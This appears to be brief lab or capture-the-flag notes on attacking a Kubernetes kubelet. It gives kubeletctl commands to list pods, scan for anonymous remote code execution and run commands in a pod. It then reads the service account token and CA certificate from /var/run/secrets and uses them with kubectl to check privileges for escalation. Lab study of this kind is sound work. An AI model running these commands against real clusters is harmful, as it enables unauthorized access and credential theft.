
# Enumeration

```bash
# listing pods
kubeletctl --server 10.129.96.167 pods

# scan rce (Check anonymous access)
kubeletctl --server 10.129.96.167 scan rce

# execute
kubeletctl --server 10.129.96.167 exec "id" -p nginx -c nginx
```

# Privilege Escalation

```bash
# see if we can get access to tokens and certificates so that we can create a service account with higher privileges
kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx

kubeletctl --server 10.129.96.98 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

If we have access to both token and certificate, we can escalate the privilege.

```bash
export token="eyJhbGciOiJSUz"

kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 get pods

# list some basic rights all using auth can-i
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:8443 auth can-i -- list
```
